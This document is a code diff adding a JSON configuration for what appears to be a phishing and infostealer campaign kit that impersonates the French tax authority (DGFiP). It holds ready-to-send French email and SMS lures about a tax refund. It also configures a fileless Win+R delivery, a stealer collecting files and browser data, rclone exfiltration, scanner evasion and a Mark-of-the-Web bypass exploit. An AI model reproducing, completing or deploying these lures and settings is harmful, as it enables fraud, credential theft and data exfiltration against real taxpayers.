@@ -1,0 +1,44 @@
+{
+  "id": "taxes",
+  "label": "Avis d'imposition / remboursement",
+  "persona": {
+    "brand": "impots.gouv",
+    "voice": "administration fiscale",
+    "urgency": "high",
+    "lexicon": ["avis d'imposition", "remboursement", "déclaration", "délai"]
+  },
+  "scenarios": ["tax_refund", "invoice", "docusign"],
+  "channels": {
+    "email": {
+      "subject": "Votre remboursement {amount} — délai {deadline}",
+      "body": "Madame, Monsieur {name},\n\nUn solde créditeur de {amount} a été constaté sur le dossier {ref}. Le versement nécessite une confirmation d'identité avant {deadline}.\n\nConfirmez en ligne : {lure}\n\nDirection générale des finances publiques — {agent}"
+    },
+    "sms": {
+      "body": "DGFiP : remboursement {amount} en attente sur dossier {ref}, confirmation avant {deadline} → {lure}"
+    }
+  },
+  "context": {
+    "inject": ["amount", "ref", "deadline", "name"]
+  },
+  "techniques": {
+    "surfaces": ["winr"],
+    "min_reliability": 4,
+    "prefer_tags": ["default", "fileless"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["files", "browser"],
+    "exfil": "rclone",
+    "sleep": 120,
+    "jitter": 0.6,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 24,
+    "variant_count": 2
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["motw-lnk"]
+}
